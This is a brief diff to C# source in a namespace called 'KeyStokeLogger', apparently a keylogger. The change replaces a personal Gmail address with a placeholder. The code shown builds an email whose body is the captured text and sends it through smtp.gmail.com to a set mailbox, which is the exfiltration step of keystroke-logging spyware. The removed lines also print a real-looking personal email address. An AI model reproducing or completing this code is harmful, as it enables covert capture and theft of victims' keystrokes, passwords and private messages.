@@ -309,7 +309,7 @@ namespace KeyStokeLogger
             keyBuffer = new StringBuilder();
             smtpClient= "smtp.gmail.com";
             smtpPort = "587";
-            mailfrom= "kuharan.bhowmik@gmail.com"; //ONLY GMAIL ALLOWED
+            mailfrom= "MAIL@gmail.com"; //ONLY GMAIL ALLOWED
 
         }
 
@@ -321,7 +321,7 @@ namespace KeyStokeLogger
             {
                 MailMessage mail = new MailMessage();
                 mail.From = new MailAddress(mailfrom);
-                mail.To.Add(new MailAddress("kuharan.bhowmik@gmail.com"));
+                mail.To.Add(new MailAddress("MAIL@gmail.com"));
                 mail.Body = richTextBox1.Text;
 
                 SmtpClient Smtp_Client = new SmtpClient("smtp.gmail.com", 587);
